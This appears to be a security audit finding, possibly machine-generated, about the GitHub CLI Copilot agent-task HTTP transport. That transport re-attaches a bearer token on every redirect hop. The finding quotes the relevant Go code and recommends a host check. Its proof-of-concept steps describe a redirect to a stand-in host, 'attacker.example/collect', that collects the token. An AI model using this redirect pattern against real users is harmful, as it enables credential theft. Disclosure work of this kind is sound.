### Title
CAPI transport unconditionally re-attaches Bearer token on every request, bypassing Go's cross-host redirect protection - (File: `pkg/cmd/agent-task/capi/client.go`)

### Summary
`capiTransport.RoundTrip` in `pkg/cmd/agent-task/capi/client.go` sets the `Authorization: Bearer <token>` header on **every** outgoing request without ever checking that the request's destination host still matches the intended Copilot API host [1](#0-0) . This is the same class of bug as the reference finding: a payment/auth credential is attached to an outgoing request without verifying it matches the token owner/recipient the credential was meant for.

### Finding Description
Elsewhere in this codebase, the general-purpose HTTP client explicitly guards against leaking the GitHub auth token across a host change during a redirect: [2](#0-1) 

That function computes `redirectHostnameChange` by comparing the current request host to the host of the original (pre-redirect) request, and only attaches the `Authorization` header `if !redirectHostnameChange`. It also refuses to overwrite an existing header (`if req.Header.Get(authorization) == ""`).

`capiTransport.RoundTrip`, used by the Copilot Agent Task client, does neither of these things: [1](#0-0) 

It calls `req.Header.Set("Authorization", "Bearer "+ct.token)` unconditionally, for every request that flows through this transport, on every hop, and it does not gate this on `req.URL.Host == ct.capiHost`. That host check is only used for the *additional* `Copilot-Integration-Id`/`X-GitHub-Api-Version` headers, not for the `Authorization` header itself.

This transport is installed by mutating the shared `http.Client` obtained from `f.HttpClient()`: [3](#0-2) 

Go's `net/http` client has a built-in security mitigation that strips the `Authorization` header when a redirect crosses to a different host, but that protection only prevents the *original* transport/header from leaking — it does not stop a `RoundTripper` wrapper from re-adding the header on the follow-up request, because `RoundTrip` is invoked again for the redirected request. Since `capiTransport.RoundTrip` re-sets the header unconditionally on every invocation, it completely defeats this built-in protection.

Requests such as `ListLatestSessionsForViewer`, `GetSession`, `GetSessionLogs`, and `ListSessionsByResourceID` are issued directly to `c.capiBaseURL` via `c.httpClient.Do(req)`: [4](#0-3) [5](#0-4) . If the Copilot API backend (or any host it redirects to, e.g. via an open-redirect flaw, misconfigured CDN, or a compromised upstream dependency) responds with an HTTP 3xx redirect pointing at an attacker-controlled host, the wrapped client will follow it and `capiTransport.RoundTrip` will attach `Authorization: Bearer <token>` to the request sent to that attacker host.

### Impact Explanation
If a `gh agent-task` request is redirected to an attacker-controlled host, the user's Copilot/GitHub bearer token is sent directly to that host, allowing credential exfiltration. Because the wrapped `http.Client` is the same client returned by `f.HttpClient()` (shared with the rest of the CLI, per the constructor's own comment "should not be reused elsewhere"), any accidental reuse elsewhere in the code compounds the exposure surface.

### Likelihood Explanation
Likelihood depends on the Copilot API backend (or a host it forwards/redirects through) ever emitting a 3xx response to a URL outside `ct.capiHost`, e.g. via an open redirect or CDN misconfiguration. This is a "normal gh command" execution path (`gh agent-task list`, `session view`, etc.) with no mocked-only precondition, no local/MITM/admin requirement — the only requirement is a redirect response from a host the client already talks to, which is analogous to the sherlock finding pattern of "does not check the token target/owner before use."

### Recommendation
Mirror the pattern already implemented in `api/http_client.go`'s `AddAuthTokenHeader`: in `capiTransport.RoundTrip`, only set `Authorization: Bearer <token>` when `req.URL.Host == ct.capiHost` (or the original, pre-redirect host), and detect/refuse to re-attach the header across a host change during a redirect, exactly as `redirectHostnameChange` does.

### Proof of Concept
1. `gh` resolves the Copilot API host and constructs a `CAPIClient` wrapping the shared HTTP client, installing `capiTransport` as its `Transport` [6](#0-5) .
2. User runs a command that calls `ListLatestSessionsForViewer`/`GetSession`, issuing a `GET` to `c.capiBaseURL` [7](#0-6) .
3. The Copilot API endpoint (or an intermediate proxy/CDN it depends on) responds with `302 Location: https://attacker.example/collect`.
4. Go's `http.Client` follows the redirect and invokes `capiTransport.RoundTrip` again for the new request to `attacker.example`.
5. `RoundTrip` unconditionally executes `req.Header.Set("Authorization", "Bearer "+ct.token)` regardless of `req.URL.Host != ct.capiHost`, sending the live bearer token to `attacker.example`.

func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)

	// Since this RoundTrip is reused for both Copilot API and
	// GitHub API requests, we conditionally add the integration
	// ID only when performing requests to the Copilot API.
	if req.URL.Host == ct.capiHost {
		req.Header.Add("Copilot-Integration-Id", "copilot-4-cli")

		// Ensure we are not using GitHub API versions while targeting CAPI.
		req.Header.Set("X-GitHub-Api-Version", "2026-01-09")
	}
	return ct.rp.RoundTrip(req)
}

// AddAuthTokenHeader adds an authentication token header for the host specified by the request.
func AddAuthTokenHeader(rt http.RoundTripper, cfg tokenGetter) http.RoundTripper {
	return &funcTripper{roundTrip: func(req *http.Request) (*http.Response, error) {
		// If the header is already set in the request, don't overwrite it.
		if req.Header.Get(authorization) == "" {
			var redirectHostnameChange bool
			if req.Response != nil && req.Response.Request != nil {
				redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
			}
			// Only set header if an initial request or redirect request to the same host as the initial request.
			// If the host has changed during a redirect do not add the authentication token header.
			if !redirectHostnameChange {
				hostname := ghauth.NormalizeHostname(getHost(req))
				if token, _ := cfg.ActiveToken(hostname); token != "" {
					req.Header.Set(authorization, fmt.Sprintf("token %s", token))
				}
			}
		}
		return rt.RoundTrip(req)
	}}
}

func CapiClientFunc(f *cmdutil.Factory) func() (capi.CapiClient, error) {
	return func() (capi.CapiClient, error) {
		cfg, err := f.Config()
		if err != nil {
			return nil, err
		}

		httpClient, err := f.HttpClient()
		if err != nil {
			return nil, err
		}

		authCfg := cfg.Authentication()
		host, _ := authCfg.DefaultHost()
		token, _ := authCfg.ActiveToken(host)

		cachedClient := api.NewCachedHTTPClient(httpClient, time.Minute*10)
		capiBaseURL, err := resolveCapiURL(cachedClient, host)
		if err != nil {
			return nil, fmt.Errorf("failed to resolve Copilot API URL: %w", err)
		}

		return capi.NewCAPIClient(httpClient, token, host, capiBaseURL), nil
	}
